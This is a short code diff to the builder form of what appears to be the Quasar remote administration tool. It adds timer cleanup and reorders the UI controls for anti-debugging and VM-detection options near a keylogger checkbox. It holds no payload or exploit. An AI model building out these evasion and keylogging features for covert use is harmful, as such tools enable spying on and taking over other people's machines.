@@ -18,6 +18,18 @@ namespace Quasar.Server.Forms
             if (disposing && (components != null))
             {
                 components.Dispose();
+                
+                if (portNotificationTimer != null)
+                {
+                    portNotificationTimer.Stop();
+                    portNotificationTimer.Dispose();
+                }
+                
+                if (portSetDelayTimer != null)
+                {
+                    portSetDelayTimer.Stop();
+                    portSetDelayTimer.Dispose();
+                }
             }
             base.Dispose(disposing);
         }
@@ -43,6 +55,11 @@ namespace Quasar.Server.Forms
             this.clearToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderTabs = new Quasar.Server.Controls.DotNetBarTabControl();
             this.generalPage = new System.Windows.Forms.TabPage();
+            this.chkAntiDebug = new System.Windows.Forms.CheckBox();
+            this.chkVM = new System.Windows.Forms.CheckBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.line2 = new Quasar.Server.Controls.Line();
+            this.label3 = new System.Windows.Forms.Label();
             this.label9 = new System.Windows.Forms.Label();
             this.line6 = new Quasar.Server.Controls.Line();
             this.label8 = new System.Windows.Forms.Label();
@@ -121,11 +138,6 @@ namespace Quasar.Server.Forms
             this.line10 = new Quasar.Server.Controls.Line();
             this.label14 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
-            this.label2 = new System.Windows.Forms.Label();
-            this.line2 = new Quasar.Server.Controls.Line();
-            this.label3 = new System.Windows.Forms.Label();
-            this.chkVM = new System.Windows.Forms.CheckBox();
-            this.chkAntiDebug = new System.Windows.Forms.CheckBox();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
             this.contextMenuStrip.SuspendLayout();
